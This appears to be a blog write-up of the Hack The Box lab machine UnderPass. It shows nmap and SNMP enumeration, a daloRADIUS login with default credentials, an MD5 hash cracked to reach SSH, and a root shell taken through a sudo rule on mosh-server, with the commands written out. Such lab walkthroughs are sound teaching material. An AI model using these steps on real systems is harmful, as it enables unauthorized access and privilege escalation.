+++
title = "HTB - UnderPass"
date = "2025-04-22"
author = "dax"
cover = ""
tags = ["snmp", "daloradius", "mosh"]
keywords = ["hacking", "htb", "underpass", "hack the box"]
description = "Write-up of Hack The Box easy machine UnderPass"
showFullContent = false
readingTime = true
hideComments = false
color = "green"
+++

# HTB - UnderPass
## Enumeration:
Nmap
```bash
# Nmap 7.95 scan initiated Fri Apr  4 13:21:10 2025 as: /usr/lib/nmap/nmap -v -p - -Pn -T4 -A -oN nmaptcp underpass.htb
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 28.785 days (since Thu Mar  6 17:31:14 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   22.07 ms 10.10.14.1
2   22.48 ms underpass.htb (10.10.11.48)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  4 13:21:40 2025 -- 1 IP address (1 host up) scanned in 30.65 seconds

# Nmap 7.95 scan initiated Fri Apr  4 13:21:25 2025 as: /usr/lib/nmap/nmap -v --top-ports 100 -Pn -T4 -A -sU -oN nmapudp underpass.htb
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.035s latency).
Not shown: 65 closed udp ports (port-unreach)
PORT      STATE         SERVICE         VERSION
161/udp   open          snmp            SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 7h23m18s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 7h23m17.75s (2659775 timeticks)

Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  4 13:26:41 2025 -- 1 IP address (1 host up) scanned in 315.62 seconds
```

## User exploit

Looking at the nmap UDP scan, we can see that SNMP port 161 is open. SNMP is used to monitor and manage devices on IP networks. It can be useful to gather information about a host (and sometimes to write that information too). In this case, as we can see from the nmap service info, the server seems to be a Daloradius server. We can also get this information by querying the `public` community with `snmp-check`.

```bash
snmp-check 10.10.11.48 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 14:24:33.70
  Uptime system                 : 14:24:22.39
  System date                   : 2025-4-23 00:28:23.0
```

As per their Github page, daloRADIUS is an advanced RADIUS web management application for managing hotspots and general-purpose ISP deployments. We can have a look at their repository to figure out the directory structure, and soon enough we can find the operator's login page on web port 80 at http://underpass.htb/daloradius/app/operators/login.php.

![](/img/htb/underpass/daloradius_login.png)

A quick Google search gives us the default credentials (administrator:radius), which allows us to log in to the operator's portal. Taking a quick look around, we eventually stumble upon the `Management > Users > List Users` interface, which contains the user `svcMosh`. It also has a very suspicious `Password` column that seems to contain a hash.

![](/img/htb/underpass/daloradius_user.png)

By editing the user and going to the `Check Attributes` tab, we can see that this is indeed an `MD5` hash for the user's password, which we can easily crack online to get the password.

![](/img/htb/underpass/daloradius_pw.png)

We can then use these credentials to log into the SSH port and get the user flag (be careful, usernames are case sensitive).

## Root exploit

Running `sudo -l` tells us that we can run the command `/usr/bin/mosh-server` as root, without supplying a password (`(ALL) NOPASSWD: /usr/bin/mosh-server`). This command allows us to start a Mobile Shell server. The Mosh Github page tells us that Mosh is a remote terminal application that supports intermittent connectivity, allows roaming, and provides speculative local echo and line editing of user keystrokes.

The Github page doesn't go into many details of how the `mosh-server` command works, but the man page is more helpful.

```
mosh-server binds to a high UDP port and chooses an encryption key to protect the session. It prints both
on standard output, detaches from the terminal, and waits for the mosh-client to establish a  connection.
It will exit if no client has contacted it within 60 seconds.
```

The `mosh-client` man page also gives us good information.

```
mosh  itself  is  a  setup  script  that establishes an SSH connection, runs the server-side helper mosh-
server, and collects the server's port number and session key.

mosh then executes mosh-client with the server's IP address, port, and session key. mosh-client runs  for
the lifetime of the connection.

The  22-byte  base64  session  key given by mosh-server is supplied in the MOSH_KEY environment variable.
This represents a 128-bit AES key that protects the integrity and confidentiality of the session.
```

Now that we know how to use the `mosh-server` and `mosh-client` commands, we can use them to get a root shell.

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60003 1DPloN+qSDealpww3Sy+/A

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 35250]

MOSH_KEY=1DPloN+qSDealpww3Sy+/A mosh-client 127.0.0.1 60003
```

## Resources:

| Hyperlink                              | Info       |
| -------------------------------------- | ---------- |
| https://github.com/lirantal/daloradius | daloRADIUS |
| https://github.com/mobile-shell/mosh   | Mosh       |
